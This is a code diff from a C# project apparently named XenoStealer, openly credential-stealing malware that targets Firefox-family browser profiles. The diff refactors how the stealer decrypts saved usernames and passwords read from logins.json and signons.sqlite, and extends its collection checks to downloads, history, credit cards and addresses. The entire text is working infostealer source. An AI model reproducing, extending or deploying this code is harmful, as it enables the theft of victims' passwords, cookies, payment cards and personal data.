@@ -24,7 +24,7 @@ namespace XenoStealer
             bool shouldGetAddresses = (options & GeckoBrowserOptions.Addresses) == GeckoBrowserOptions.Addresses;
 
 
-            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills) 
+            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills && !ShouldGetDownloads && !ShouldGetHistory && !shouldGetCreditCards && !shouldGetAddresses) 
             {
                 return new DataExtractionStructs.GeckoBrowser[0];
             }
@@ -33,28 +33,11 @@ namespace XenoStealer
             {
                 List<DataExtractionStructs.GeckoProfile> profiles = new List<DataExtractionStructs.GeckoProfile>();
 
-                GeckoDecryptor decryptor = null;
-
-                bool GetBrowserLogins = ShouldGetLogins;
-
                 string browserName = browserInfo.Key;
                 string browserProfilesPath = browserInfo.Value;
-                string browserLibraryPath = Configuration.GeckoLibraryPaths[browserName];
                 if (!Directory.Exists(browserProfilesPath)) 
                 {
                     continue;
-                }
-                if (GetBrowserLogins) 
-                {
-                    if (!Directory.Exists(browserProfilesPath))
-                    {
-                        GetBrowserLogins = false;
-                    }
-                    else 
-                    {
-                        decryptor = new GeckoDecryptor(browserLibraryPath);
-                        GetBrowserLogins = decryptor.Operational;
-                    }
                 }
 
                 foreach (string profilePath in Directory.GetDirectories(browserProfilesPath)) 
@@ -70,9 +53,9 @@ namespace XenoStealer
                     GeckoAddressInfo[] addresses = null;
 
 
-                    if (GetBrowserLogins) 
+                    if (ShouldGetLogins) 
                     {
-                        logins = GetLogins(profilePath, decryptor);
+                        logins = GetLogins(profilePath);
                     }
                     if (ShouldGetCookies) 
                     {
@@ -110,8 +93,6 @@ namespace XenoStealer
 
                     profiles.Add(new GeckoProfile(logins, cookies, autofills, downloads, history, creditCards, addresses, profileName));
                 }
-
-                decryptor?.Dispose();
 
                 browsers.Add(new GeckoBrowser(profiles.ToArray(), browserName));
             }
@@ -241,16 +222,9 @@ namespace XenoStealer
             return cookies.ToArray();
 
         }
-        public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath, GeckoDecryptor decryptor) 
+        public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath) 
         {
             List<DataExtractionStructs.GeckoLogin> logins = new List<DataExtractionStructs.GeckoLogin>();
-
-
-            if (!decryptor.SetProfilePath(profilePath)) 
-            {
-                return null;
-                //fail.
-            }
 
             string SQLpath = Path.Combine(profilePath, "signons.sqlite");
             string JSONpath = Path.Combine(profilePath, "logins.json");
@@ -300,8 +274,8 @@ namespace XenoStealer
                         string hostname = (string)hostname_obj;
                         string encryptedUsername = (string)encryptedUsername_obj;
                         string encryptedPassword = (string)encryptedPassword_obj;
-                        string username = decryptor.Decrypt(encryptedUsername);
-                        string password = decryptor.Decrypt(encryptedPassword);
+                        string username = GeckoDecryptor.Decrypt(profilePath, encryptedUsername);
+                        string password = GeckoDecryptor.Decrypt(profilePath, encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
                         logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                         //add it to passwords and stuff.
@@ -349,8 +323,8 @@ namespace XenoStealer
                                 string hostname = (string)login["hostname"];
                                 string encryptedUsername = (string)login["encryptedUsername"];
                                 string encryptedPassword = (string)login["encryptedPassword"];
-                                string username = decryptor.Decrypt(encryptedUsername);
-                                string password = decryptor.Decrypt(encryptedPassword);
+                                string username = GeckoDecryptor.Decrypt(profilePath, encryptedUsername);
+                                string password = GeckoDecryptor.Decrypt(profilePath, encryptedPassword);
                                 if (hostname == null || username == null || password == null) continue;
                                 logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                 //add it to passwords and stuff.
